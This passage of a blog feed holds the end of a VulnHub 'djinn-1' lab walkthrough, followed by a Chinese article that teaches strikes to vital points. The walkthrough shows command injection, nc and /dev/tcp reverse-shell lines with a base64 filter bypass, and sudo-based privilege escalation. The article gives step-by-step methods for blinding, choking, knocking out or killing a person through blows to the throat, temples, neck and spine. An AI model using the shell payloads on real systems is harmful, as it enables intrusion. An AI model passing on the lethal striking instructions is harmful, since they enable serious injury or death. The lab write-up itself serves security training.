class="keyword">in</span> 0.02 secs (7.0244 kB/s)</span><br><span class="line">ftp&gt; get message.txt</span><br><span class="line"><span class="built_in">local</span>: message.txt remote: message.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> message.txt (113 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">113 bytes received <span class="keyword">in</span> 0.05 secs (2.4331 kB/s)</span><br></pre></td></tr></table></figure>

<p>use cat command to check the content</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># cat creds.txt </span></span><br><span class="line">nitu:81299</span><br><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># cat game.txt </span></span><br><span class="line">oh and I forgot to tell you I<span class="string">&#x27;ve setup a game for you on port 1337. See if you can reach to the </span></span><br><span class="line"><span class="string">final level and get the prize.</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/djinn-1# cat message.txt </span></span><br><span class="line"><span class="string">@nitish81299 I am going on holidays for few days, please take care of all the work. </span></span><br><span class="line"><span class="string">And don&#x27;</span>t mess up anything.</span><br></pre></td></tr></table></figure>

<p>use Netcat to make a connection so that we can play the game</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.127 1337</span></span><br><span class="line">  ____                        _____ _                </span><br><span class="line"> / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ </span><br><span class="line">| |  _ / _` | <span class="string">&#x27;_ ` _ \ / _ \   | | | | &#x27;</span>_ ` _ \ / _ \</span><br><span class="line">| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/</span><br><span class="line"> \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s see how good you are with simple maths</span></span><br><span class="line"><span class="string">Answer my questions 1000 times and I&#x27;</span>ll give you your gift.</span><br><span class="line">(9, <span class="string">&#x27;+&#x27;</span>, 9)</span><br><span class="line">&gt; 18</span><br><span class="line">(3, <span class="string">&#x27;-&#x27;</span>, 1)</span><br><span class="line">&gt; 2</span><br><span class="line">(2, <span class="string">&#x27;/&#x27;</span>, 3)</span><br><span class="line">&gt; 2</span><br><span class="line">Wrong answer</span><br></pre></td></tr></table></figure>

<p>it’s just a  waste time game, go for next step</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/</span><br></pre></td></tr></table></figure>

<p>use gobuster for dir</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127:7331/ -w /usr/share/wordlists/dirb/big.txt -t 500</span><br><span class="line">/genie (Status: 200)</span><br><span class="line">/wish (Status: 200)</span><br></pre></td></tr></table></figure>

<p>genie page is an error 403,perhaps it’s no use<br>the following page is a little interesting</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/wish</span><br></pre></td></tr></table></figure>

<p>this page can excecute commands</p>
<p>request:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /wish HTTP/1.1</span><br><span class="line">Host: 192.168.56.127:7331</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Origin: http://192.168.56.127:7331</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.127:7331/wish</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">cmd=id</span><br></pre></td></tr></table></figure>

<p>response:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 302 FOUND</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 379</span><br><span class="line">Location: http://192.168.56.127:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</span><br><span class="line">Server: Werkzeug/0.16.0 Python/2.7.15+</span><br><span class="line">Date: Sat, 23 May 2020 05:03:45 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href=<span class="string">&quot;/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A&quot;</span>&gt;/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A&lt;/a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploitation</li>
</ul>
<p>get a shell by using nc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.56.126 1155</span><br></pre></td></tr></table></figure>

<p>excecute the payload, we got the following error</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/genie?name=Wrong+choice+of+words</span><br></pre></td></tr></table></figure>

<p>some of the symbols are characters are restricted</p>
<p>we can use other payload, encrypt the whole command in base64 format </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.56.126/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNi84MDgwIDA+JjE= | base64 -d | bash</span><br></pre></td></tr></table></figure>

<p>then we get a shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 8080</span></span><br><span class="line">listening on [any] 8080 ...</span><br><span class="line">192.168.56.127: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.126] from (UNKNOWN) [192.168.56.127] 47358</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (758): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@djinn:/opt/80$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@djinn:/opt/80$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>let’s take a look around</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@djinn:/opt/80$ cat app.py</span><br><span class="line">cat app.py</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">from flask import Flask, redirect, render_template, request, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line">CREDS = <span class="string">&quot;/home/nitish/.dev/creds.txt&quot;</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;;&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def validate(cmd):</span><br><span class="line">    <span class="keyword">if</span> CREDS <span class="keyword">in</span> cmd and <span class="string">&quot;cat&quot;</span> not <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    <span class="built_in">return</span> False</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    except Exception:</span><br><span class="line">        <span class="built_in">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/wish&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def wish():</span><br><span class="line">    execute = request.form.get(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> execute:</span><br><span class="line">        <span class="keyword">if</span> validate(execute):</span><br><span class="line">            output = subprocess.Popen(execute, shell=True,</span><br><span class="line">                                      stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">&quot;Wrong choice of words&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> redirect(url_for(<span class="string">&quot;genie&quot;</span>, name=output))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&#x27;wish.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/genie&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def genie():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&quot;It&#x27;s not that hard&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&#x27;genie.html&#x27;</span>, file=page)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=True)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /home/nitish/.dev/creds.txt</span><br><span class="line">nitish:p4ssw0rdStr3r0n9</span><br></pre></td></tr></table></figure>

<p>change our shell to a tty shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@djinn:/opt/80$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ su nitish</span><br><span class="line">su nitish</span><br><span class="line">Password: p4ssw0rdStr3r0n9</span><br><span class="line"></span><br><span class="line">nitish@djinn:/opt/80$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)</span><br><span class="line">nitish@djinn:/opt/80$ whoami</span><br><span class="line">whoami</span><br><span class="line">nitish</span><br></pre></td></tr></table></figure>

<p>finally, we get user.txt…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:/opt/80$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">nitish@djinn:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">nitish@djinn:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">10aay8289ptgguy1pvfa73alzusyyx3c</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub276.jpg"></li>
</ul>
<h3 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ sudo -l                                                                              </span><br><span class="line">sudo -l                                                                                              </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nitish on djinn:                                                       </span><br><span class="line">    env_reset, mail_badpass,                                                                         </span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin         </span><br><span class="line"></span><br><span class="line">User nitish may run the following commands on djinn:</span><br><span class="line">    (sam) NOPASSWD: /usr/bin/genie</span><br></pre></td></tr></table></figure>

<p>understand how it works</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ genie</span><br><span class="line">genie</span><br><span class="line">usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line">genie: error: the following arguments are required: wish</span><br><span class="line">nitish@djinn:~$ genie -h</span><br><span class="line">genie -h</span><br><span class="line">usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line"></span><br><span class="line">I know you<span class="string">&#x27;ve came to me bearing wishes in mind. So go ahead make your wishes.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">positional arguments:</span></span><br><span class="line"><span class="string">  wish                  Enter your wish</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">optional arguments:</span></span><br><span class="line"><span class="string">  -h, --help            show this help message and exit</span></span><br><span class="line"><span class="string">  -g, --god             pass the wish to god</span></span><br><span class="line"><span class="string">  -p SHELL, --shell SHELL</span></span><br><span class="line"><span class="string">                        Gives you shell</span></span><br><span class="line"><span class="string">  -e EXEC, --exec EXEC  execute command</span></span><br></pre></td></tr></table></figure>

<p>now we get a shell of user sam</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ sudo -u sam genie -cmd new</span><br><span class="line">sudo -u sam genie -cmd new</span><br><span class="line">my man!!</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>

<p>use the following command to get a stable shell,then enumerate again</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash</span><br><span class="line">bash</span><br><span class="line">sam@djinn:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sam on djinn:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User sam may run the following commands on djinn:</span><br><span class="line">    (root) NOPASSWD: /root/lago</span><br></pre></td></tr></table></figure>

<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>and we get root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sam@djinn:~$ sudo -u root /root/lago </span><br><span class="line">sudo -u root /root/lago</span><br><span class="line">What <span class="keyword">do</span> you want to <span class="keyword">do</span> ?</span><br><span class="line">1 - Be naughty</span><br><span class="line">2 - Guess the number</span><br><span class="line">3 - Read some damn files</span><br><span class="line">4 - Work</span><br><span class="line">Enter your choice:2</span><br><span class="line">2</span><br><span class="line">Choose a number between 1 to 100: </span><br><span class="line">Enter your number: num</span><br><span class="line">num</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>next, we try to find the flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">bash</span><br><span class="line">root@djinn:~<span class="comment"># su root</span></span><br><span class="line">su root</span><br><span class="line">root@djinn:/home/nitish<span class="comment"># cd</span></span><br><span class="line">root@djinn:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">lago  proof.sh</span><br><span class="line">root@djinn:~<span class="comment"># ./proof.sh</span></span><br><span class="line">./proof.sh</span><br><span class="line"><span class="string">&#x27;unknown&#x27;</span>: I need something more specific.</span><br><span class="line">    _                        _             _ _ _ </span><br><span class="line">   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |</span><br><span class="line">  / _ \ | <span class="string">&#x27;_ ` _ \ / _` |_  / | &#x27;</span>_ \ / _` | | | |</span><br><span class="line"> / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|</span><br><span class="line">/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)</span><br><span class="line">                                     |___/       </span><br><span class="line">djinn pwned...</span><br><span class="line">__________________________________________________________________________</span><br><span class="line"></span><br><span class="line">Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc</span><br><span class="line">Path: /root</span><br><span class="line">Date: Sat May 23 11:23:39 IST 2020</span><br><span class="line">Whoami: root</span><br><span class="line">__________________________________________________________________________</span><br><span class="line"></span><br><span class="line">By @0xmzfr</span><br><span class="line"></span><br><span class="line">Thanks to my fellow teammates <span class="keyword">in</span> @m0tl3ycr3w <span class="keyword">for</span> betatesting! :-)</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub277.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>Command execution bypass</li>
<li>Sensitive information disclosure</li>
<li>custom program Privilege Escalation</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>(肉搏)最快使人突然晕厥的方法</title>
    <url>/2019/02/13/fight/</url>
    <content><![CDATA[<h3 id="仅供学习防身参考使用"><a href="#仅供学习防身参考使用" class="headerlink" title="仅供学习防身参考使用"></a>仅供学习防身参考使用</h3><p>1.頭部要害及擊打方法：頭部是要害部位集中的地方，主要有十個要害區。<br>(一)耳：耳廊神經離大腦較近，受到擊打後可損傷腦膜中的動脈。擊打的穴位是面部神經主枝至耳頂端上部。擊打方法：兩手成杯狀；同時拍擊雙耳。在中國傳統武術中叫“雙峰貫耳”。掐拿耳根可會產生劇烈的酸痛感，重可令人昏厥。用掌劈擊耳根可令人立即斃命。<br>擊打後果：輕則擊穿耳膜或耳內出血，重則致腦震盪或死亡。<br>（二）太陽穴：此部位骨質脆弱。在眼角後約5厘米，向上約2.5厘米處，有一根聶頁神經，向內朝顱骨方向擊打，極容易制敵。擊打方法：用掌外側、拳、肘等擊打，用橫削掌砍擊太陽穴.如敵倒地則用足尖。<br>擊打後果：輕則腦震盪，重則死亡。<br>（三）眼睛：擊打方法：用食指，中指猛刺敵雙眼，插眼要由下至上插入，則插即中。中國傳統武術稱“雙龍取珠”。也可挖敵雙眼。<br>擊打後果：造成雙目失明，失去戰鬥力。<br>（四）鼻：擊打方法；用掌外側或拳頭橫擊鼻樑。由上而下擊打鼻骨，一擊即斷碎.<br>擊打後果； 可擊碎鼻樑骨，使敵疼痛難忍。<br>（五）上唇：此處是鼻軟骨與硬骨的連接處，神經接近皮層。<br>擊打方法：用掌的小指一側猛擊或用拳戳擊。<br>擊打後果：輕則劇痛，重則能使人昏迷。<br>（六）下巴：擊打方法；用掌根猛擊敵下巴。因為用拳很可能損傷自己的手指關節，但如果拳頭硬度不錯，用拳頭擊打，往往一招就令敵騰空而倒。勾拳擊頜下，可令人轟然倒下成腦震盪<br>擊打後果：劇痛或脫位。<br>（七）喉結：喉結處有氣管，頸動脈還有迷走神經。<br>擊打方法：用八字拳術或用掌外側硬擊，也可用手指抓捏。<br>擊打後果：輕則疼痛難忍，重則昏迷或死亡。<br>（八）咽喉：擊打方法：用手指猛戳咽喉下部的凹處。<br>擊打後果：可使敵感到劇痛，窒息。<br>（九）頸外側：擊打方法：用掌外側猛砍。<br>擊打後果：昏迷。<br>（十）頸後部：擊打方法：用掌或拳的小指一側劈砸。劈拳擊頸後枕下三角區。<br>擊打後果：可令人立即昏迷至致敵死亡。</p>
<a id="more"></a>

<p>2、軀幹要害部位及擊打方法：軀幹中有鎖骨、腋窩、腹、襠、脊椎及心、肺、脾、胃、腎等要害部位。<br>（一）鎖骨：肩部有“肩井穴”，用掌外側砍劈後，傷及“雲門”“中府”兩穴，直接擊打鎖骨，也可收到良好的效果。<br>擊打方法：用掌外側向下猛砍。<br>擊打後果；可打斷鎖骨，使其癱倒。<br>（二）腋窩：格鬥時，很少有人想到擊打這個部位。其實腋窩下有一條粗大的神經，很不經打。<br>擊打方法：敵倒地後，用腳尖猛踢。<br>擊打後果：劇痛或短暫的局部癱瘓。<br>（三）心窩；擊打方法：用尖拳猛戳，不宜用手掌或拳頭。<br>擊打後果；劇痛難忍，昏迷。<br>（四）腹部：腹部包括腹腔劍突以下肚臍以上的部位，肝、脾、腎、胃重要器官密布其中。<br>擊打方法；拳打，膝頂，肘擊，腳踢。穿透力最理想是拳指關節猛擊。<br>擊打後果；致傷，死亡。<br>（五）襠部：人體神經末梢最豐富，敏感的地方。<br>擊打方法；膝頂，腳踢，手抓。<br>擊打後果：劇痛，甚至死亡。<br>（六）腎部：擊打方法：用掌外側砍，拳打，腳踢等。<br>擊打後果；腎部致傷。可令人休克。<br>（七）肋部：最理想是擊打右肋部，因肝臟位於右肋下部，此處骨頭也最細脆，容易折斷。折斷的肋骨很容易刺破內臟。<br>擊打方法：掌砍，腳尖踢，膝頂等。<br>擊打後果：肝臟嚴重損傷，重則死亡。<br>（八）脊椎：它是人體支柱，受到擊打，極易脫位。<br>擊打方法：敵倒地後，用膝，肘，腳頂，撞，踩，部位是皮帶上方9厘米處。擊打後果：癱瘓，死亡。</p>
<p>3、四肢要害及擊打方法；四肢骨共有100多塊。施以正確的擊打方法導致脫臼、骨折或韌帶撕裂。在施用擒拿術時，對四肢關節是不能不高度重視的。<br>（一）指關節：都是單軸關節，活動範圍較小，只能伸屈，伸直時，往後或往兩側猛折會造成脫臼或骨折。<br>擊打方法；用手猛折。<br>擊打後果：骨折，脫臼。<br>（二）腕關節：腕關節有8塊腕骨，骨小易碎。<br>擊打方法：施用擒拿術時，用掌外側扣壓。<br>擊打後果：脫臼、骨折、劇痛難熬。<br>（三）肘關節：它由橈骨，尺骨和肱骨連接而成，完全伸直後，最怕從後施加壓力或擊打。<br>擊打方法；用拳或掌擊肘後部，膝蓋猛風吹草動或用小臂壓擊。<br>擊打後果：脫臼，韌帶撕裂。<br>（四）肩關節：肩關節由肩胛骨，肱骨和鎖骨連接而成，最怕左右猛擰和往後上板​​至極點。<br>擊打方法：敵倒地後，用膝頂壓或用腳猛踩。<br>擊打後果：脫臼、韌帶和肌肉撕裂。<br>（五）膝關節；膝關節由兩個關節複合而成，有臏骨，腓骨，脛骨，半月板和股骨。<br>擊打方法：伸直時，從前方，側方用腳猛力蹬踹。膝關節伸直時正面衝擊容易損傷，彎曲時側面易損傷。<br>擊打後果；脫臼或骨折，半月板破裂。<br>（六）腳背：腳背神經密布，肌肉較少，忌用腳踩。<br>擊打方法；用腳後跟猛踩，或腳尖很戳。<br>擊打後果；骨頭斷裂，劇痛難熬</p>
<p>（1）人體要害部位：咽喉<br>喉部的要害主要為咽喉和喉結。在頸部前面，兩鎖骨內側、胸骨柄上緣有一個凹陷，凹陷內有下行的無名靜脈、氣管、食管以及膈神經和迷走神經分支。氣管位於皮下最表層。這一凹陷部位通常被俗稱為咽喉，在中醫經絡學上，又被稱為“天突穴”。 “天災穴”自古被視為要害部位，少林拳法中還傳有“二捅天突穴，鎖喉致昏啞”的技擊歌訣。</p>
<p>以手指用力直戳天突穴，可以猛烈地壓迫氣管，刺激迷走神經和膈神經，引起反射性的呼吸困難和劇烈咳嗽，甚至引起窒息。肺部的迷走神經直接分佈於氣管及肺內的支氣管樹，支配著肺臟的呼吸，而膈神經則直接分佈於人體最主要的呼吸肌——膈肌的中央，支配著膈肌的運動。膈神經遭強烈刺激必然造成膈肌痙攣，引起劇烈咳嗽和呼吸困難，迷走神經遇強烈刺檄則會通過延髓的迷走神經中樞使肺的呼吸功能受到反射性的抑制，其結果，很容易導致窒息。以手指持續用力掐拿天突穴，可以使氣管、無名靜脈、迷走神經和膈神經同時受到壓迫，並可因呼吸受阻、靜脈回流受阻、腦缺氧和神經反射作用，引起窒息或昏迷。</p>
<p>打擊或掐拿天突穴，一般不會造成致命的後果，但如果咽喉被刺破，則會造成嚴重的血胸和縱膈氣腫，使大量血液流入胸腔，並使縱膈和頸部皮下發生氣腫。血胸和縱膈氣腫會壓迫肺臟和心臟，都可以在短時間使人死亡。</p>
<p>喉結在頸部正中，突出於皮下，成年男子尤為顯著。喉結上通咽和口、鼻腔，下連氣管，是肺臟與外界進行氣體交換的通氣要道。喉由軟骨構成支架，其中甲狀軟骨為最大的一塊，甲狀軟骨在頸的突出的部份即為喉結。喉結通常被人們視為要害部位。打擊喉結、扼喉、勒頸、以及銳器切頸常常被當作致命的殺傷手段。據法醫臨案統計，很多自殺或殺人者都習慣於在喉結上下切頸。</p>
<p>無論自殺或他殺，切頸者多誤認為切斷氣管或喉管便可以輕易致死。但事實上，切斷氣管僅僅縮短了呼吸道，並不能構成真正的死因。而徒手以拳、掌打擊喉結或勒頸、扼喉、壓迫喉結，卻都能致人於死地。</p>
<p>1、持續壓迫喉結可使呼吸、循環受阻<br>鎖喉、扼喉、勒頸、以掌指持續地壓迫喉結一般並不能使人立即致死，多需要經過一段時間，死亡速度比較緩慢。壓迫喉結致死，主要是由於阻斷了呼吸和阻斷了腦循環血流引起的。以掌指壓迫喉結，一般都不能使呼吸道完全阻塞。呼吸道完全被阻塞的可能性極小，只有以較細的繩索勒壓在甲狀軟骨與舌骨之間時才會發生。由於扼喉時呼吸受阻是不完全的，因而造成的窒息也是不完全的。在這種情況下致死過程就需要持續一段時間。</p>
<p>而以掌指壓迫喉結時，一般也不能完全阻斷頭、頸部的循環血流。向頭部供血的頸動脈因為有胸鎖乳突肌的覆蓋，不易被完全阻斷，深層的椎動脈受頸椎的保護，根本壓迫不到，仍能保持暢通。所以，頸部受壓時動脈供血受阻也是不完全的。只有頸靜脈回流受阻通常比較嚴重。然而頸靜脈回流受阻也不能在喉結受壓後立即形成。因此，由動脈供血不足，靜脈回流受阻引起的頭部淤血、顱內壓升高和腦缺氧也需要持續一定的時間才能真正形成。</p>
<p>無論壓迫了呼吸道使肺通氣受阻，還是壓迫了動、靜脈血管使腦循環血流受阻，都會由於腦血流中二氧化碳濃度不斷升高，氧分壓逐漸下降，引起大腦缺氧而導致死亡。在腦缺氧形成以後，腦組織仍有一定的耐受時間，一般腦缺氧1—3分鐘可使人陷入昏迷， 5—6分鐘才能使人完全死亡。腦缺氧形成以後，還會刺激頸動脈中的“化學感受裝置”，使人產生強烈的深呼吸慾望，繼而會產生窒息的恐懼心理和垂死的反抗和掙扎。在抵抗力量較大的情況下，死亡速度通常比較緩慢，一般都需要幾分鐘時間。</p>
<p>2、打擊喉結可以立即致死<br>以拳、掌打擊喉結可以立即致人於死地。這主要是由於喉結上的喉上神經和食管上的迷走神經叢受到強力刺激，致使心跳、呼吸產生反射性抑制的結果。喉上神經是迷走神經的一個分支，也是頸部皮下一個重要的感覺神經末稍。食管迷走神經叢在緊靠氣管後壁的食管上，由左右迷走神經相互交錯而成。迷走神經聯繫著延髓迷走神經中樞，對心跳、呼吸有強烈的抑製作用。強力打擊喉結，會刺激喉上神經和食管迷走神經叢產生強烈興奮，傳入延髓，引起反射性閉氣、突然窒息、心率銳減、血壓下降，甚至引起呼吸、心跳驟停而立即導致昏迷或死亡。<br>（2）劈拳擊後腦，輕則腦震盪、昏迷、重則斃命。</p>
<p><font color="red"><strong><em>切記 在最危急時才能使用 否則難逃刑責</em></strong></font></p>
]]></content>
      <categories>
        <category>搏击</category>
      </categories>
      <tags>
        <tag>肉搏技术</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[EVM-1]</title>
